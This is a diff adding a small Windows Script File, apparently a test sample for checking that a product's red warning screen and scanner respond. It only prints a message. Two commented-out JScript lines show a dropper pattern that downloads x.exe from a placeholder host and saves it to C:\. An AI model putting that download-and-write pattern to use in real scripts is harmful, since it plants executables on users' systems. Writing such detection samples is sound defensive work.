@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Bionic Runner: 赤い警告画面の確認用の Windows Script File。害はありません。 -->
+<package>
+  <job id="test">
+    <script language="JScript">
+      // 下の 2 行はコメントなので、実際には何もしません (検査が反応するかを確かめるための見本です)。
+      // var h = new ActiveXObject("MSXML2.XMLHTTP"); h.open("GET", "http://example.invalid/x.exe", false);
+      // var s = new ActiveXObject("ADODB.Stream"); s.SaveToFile("C:\\x.exe");
+      WScript.Echo("この確認用スクリプトは、文字を出すだけです");
+    </script>
+  </job>
+</package>
